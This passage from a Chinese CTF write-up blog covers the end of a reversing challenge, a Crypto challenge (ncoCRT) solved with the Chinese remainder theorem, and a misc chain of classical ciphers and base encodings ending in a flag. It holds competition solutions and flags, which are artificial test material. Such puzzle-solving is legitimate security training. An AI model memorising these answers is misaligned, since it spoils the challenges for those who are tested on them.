eeee[i] ^=  dddd[i+<span class="number">1</span>];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] -=  ccc[i];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            bbb[i] +=  ccc[<span class="number">47</span> + i];  </span><br><span class="line">             ccc[i]^=eeee[<span class="number">51</span>];</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        bbb[i] ^=  ccc[i];  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bbb[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-002954373.png" class=""><br>得到一个博客网址<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-003101352.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-003116642.png" class=""><br>RC4加密<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-003242429.png" class="">  </p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;SYC&#123;...&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag+<span class="string">b&#x27;\x01&#x27;</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">p = [<span class="number">0</span>]*<span class="number">5</span></span><br><span class="line">c = [<span class="number">0</span>]*<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p0 = random.randint(<span class="number">2</span>**<span class="number">100</span>,<span class="number">2</span>**<span class="number">101</span>)</span><br><span class="line">    p[i] = p0</span><br><span class="line">c = [m%p[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = [1921232050179818686537976490035, 2050175089402111328155892746480, 1960810970476421389691930930824, 1797713136323968089432024221276, 2326915607951286191807212748022]</span></span><br><span class="line"><span class="string">c = [1259284928311091851012441581576, 1501691203352712190922548476321, 1660842626322200346728249202857, 657314037433265072289232145909, 2056630082529583499248887436721]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>使用中国剩余定理来解<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line">from sympy.ntheory.modular import solve_congruence</span><br><span class="line"></span><br><span class="line">p = [1921232050179818686537976490035,</span><br><span class="line">     2050175089402111328155892746480,</span><br><span class="line">     1960810970476421389691930930824,</span><br><span class="line">     1797713136323968089432024221276,</span><br><span class="line">     2326915607951286191807212748022]</span><br><span class="line"></span><br><span class="line">c = [1259284928311091851012441581576,</span><br><span class="line">     1501691203352712190922548476321,</span><br><span class="line">     1660842626322200346728249202857,</span><br><span class="line">     657314037433265072289232145909,</span><br><span class="line">     2056630082529583499248887436721]</span><br><span class="line"></span><br><span class="line">m, _ = solve_congruence(*[(c[i], p[i]) for i in range(5)])</span><br><span class="line"></span><br><span class="line">flag_with_padding = long_to_bytes(m)</span><br><span class="line">flag = flag_with_padding[:-23]  </span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-004957317.png" class="">  </p>
<h1 id="不是套娃"><a href="#不是套娃" class="headerlink" title="不是套娃"></a>不是套娃</h1><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-120455298.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-120455578.png" class="">  
<p>摩斯密码<br>转小写<br>xin_ji_zi_wa_yi_zi_mo_yi_dua_zi<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121320756.png" class=""><br>维吉尼亚解密</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121439679.png" class="">  
<p>hash加密<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121533960.png" class="">  </p>
<p>栅栏解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ba &amp; Ro</span><br><span class="line">100 -&gt; 13 -&gt; 64 -&gt; 65536</span><br></pre></td></tr></table></figure>
<p>因为密文是emoji表情包即base100编码可以猜测tip的意思是base和rot那么应该就是base100-&gt;rot13-&gt;base64-&gt;base65535<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121800068.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121900633.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121932037.png" class="">  </p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-122011384.png" class="">  
<p>将繁体字改成簡體字即可打开压缩包<br>原神，启动！</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-122104178.png" class="">  
<p>SYC{H0W_P3RF3C+_YU0_AR3!}</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lisien11.xyz">L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lisien11.xyz/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">https://lisien11.xyz/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lisien11.xyz" target="_blank">L的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover37.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/" title="网鼎青龙组"><img class="cover" src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover71.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网鼎青龙组</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/" title="龙信杯2024"><img class="cover" src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover51.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">龙信杯2024</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg" onerror="this.onerror=null;this.src='/img/lll.png'" alt="avatar"/></div><div class="author-info__name">L</div><div class="author-info__description">我只是一个平平无奇路过的普通大学生罢了</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">43</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lisien11"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lisien11" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2488218724@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">无人问津也好，技不如人也罢，你都要试着安静下来，去做自己该做的事，而不是让内心烦躁焦虑，毁掉你本就不多的热情和定力。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%AA"><span class="toc-number">1.1.</span> <span class="toc-text">雪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doSomeMath"><span class="toc-number">1.2.</span> <span class="toc-text">doSomeMath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Secret-of-Starven"><span class="toc-number">1.3.</span> <span class="toc-text">Secret of Starven</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-jail"><span class="toc-number">1.4.</span> <span class="toc-text">hard_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truth-of-Word"><span class="toc-number">1.5.</span> <span class="toc-text">Truth of Word</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Welcome-jail"><span class="toc-number">1.6.</span> <span class="toc-text">Welcome_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E7%9A%84%E8%A7%89%E9%86%92"><span class="toc-number">1.7.</span> <span class="toc-text">舔狗的觉醒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cimbar"><span class="toc-number">1.8.</span> <span class="toc-text">cimbar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-jpg"><span class="toc-number">1.9.</span> <span class="toc-text">ez_jpg</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-number">2.1.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-On-My-Web"><span class="toc-number">2.2.</span> <span class="toc-text">Problem_On_My_Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-http"><span class="toc-number">2.3.</span> <span class="toc-text">ez_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Can-you-Pass-Me"><span class="toc-number">2.4.</span> <span class="toc-text">Can_you_Pass_Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-SSRF"><span class="toc-number">2.5.</span> <span class="toc-text">ez_SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#escapeSandbox-PLUS"><span class="toc-number">2.6.</span> <span class="toc-text">escapeSandbox_PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#noSandbox"><span class="toc-number">2.7.</span> <span class="toc-text">noSandbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#100-%E7%9A%84%E2%9A%AA"><span class="toc-number">2.8.</span> <span class="toc-text">100%的⚪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce-me"><span class="toc-number">2.9.</span> <span class="toc-text">rce_me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SecretInDrivingSchool"><span class="toc-number">2.10.</span> <span class="toc-text">SecretInDrivingSchool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-upload"><span class="toc-number">2.11.</span> <span class="toc-text">baby_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">2.12.</span> <span class="toc-text">ez_python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-just-pop"><span class="toc-number">2.13.</span> <span class="toc-text">not_just_pop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%8D%E6%AF%94java%E5%B7%AE"><span class="toc-number">2.14.</span> <span class="toc-text">php不比java差</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py-game"><span class="toc-number">2.15.</span> <span class="toc-text">py_game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include"><span class="toc-number">2.16.</span> <span class="toc-text">ez_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt-pickle"><span class="toc-number">2.17.</span> <span class="toc-text">jwt_pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-js"><span class="toc-number">2.18.</span> <span class="toc-text">ez_js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#funnySQL"><span class="toc-number">2.19.</span> <span class="toc-text">funnySQL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">3.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9F%E8%AE%B8%E4%BD%A0%E4%B9%9F%E5%90%ACjay"><span class="toc-number">3.1.</span> <span class="toc-text">也许你也听jay</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ncoCRT"><span class="toc-number">4.1.</span> <span class="toc-text">ncoCRT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E6%98%AF%E5%A5%97%E5%A8%83"><span class="toc-number">5.</span> <span class="toc-text">不是套娃</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/07/java-sec-code/" title="java-sec-code"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover86.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java-sec-code"/></a><div class="content"><a class="title" href="/2025/04/07/java-sec-code/" title="java-sec-code">java-sec-code</a><time datetime="2025-04-07T06:37:12.000Z" title="发表于 2025-04-07 14:37:12">2025-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/XYCTF/" title="XYCTF"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover39.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XYCTF"/></a><div class="content"><a class="title" href="/2025/04/04/XYCTF/" title="XYCTF">XYCTF</a><time datetime="2025-04-04T10:37:29.000Z" title="发表于 2025-04-04 18:37:29">2025-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/31/Blowfish%E7%AE%97%E6%B3%95/" title="TDEA算法"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover93.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TDEA算法"/></a><div class="content"><a class="title" href="/2025/03/31/Blowfish%E7%AE%97%E6%B3%95/" title="TDEA算法">TDEA算法</a><time datetime="2025-03-31T00:40:07.000Z" title="发表于 2025-03-31 08:40:07">2025-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/30/%E4%B8%80%E6%9D%A1emlog%E7%9A%84%E6%B0%B4%E6%B4%9E/" title="一条emlog的水洞"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover75.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一条emlog的水洞"/></a><div class="content"><a class="title" href="/2025/03/30/%E4%B8%80%E6%9D%A1emlog%E7%9A%84%E6%B0%B4%E6%B4%9E/" title="一条emlog的水洞">一条emlog的水洞</a><time datetime="2025-03-30T14:01:40.000Z" title="发表于 2025-03-30 22:01:40">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/30/DES%E5%8A%A0%E5%AF%86%E4%B8%8ETDEA/" title="DES加密与TDEA"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover82.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DES加密与TDEA"/></a><div class="content"><a class="title" href="/2025/03/30/DES%E5%8A%A0%E5%AF%86%E4%B8%8ETDEA/" title="DES加密与TDEA">DES加密与TDEA</a><time datetime="2025-03-30T10:50:39.000Z" title="发表于 2025-03-30 18:50:39">2025-03-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://tw-sigma.vercel.app/',
      region: 'ap-guangzhou',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(init,0)
    else getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(init)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://tw-sigma.vercel.app/',
      region: 'ap-guangzhou',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
      
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="/js/LSE.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>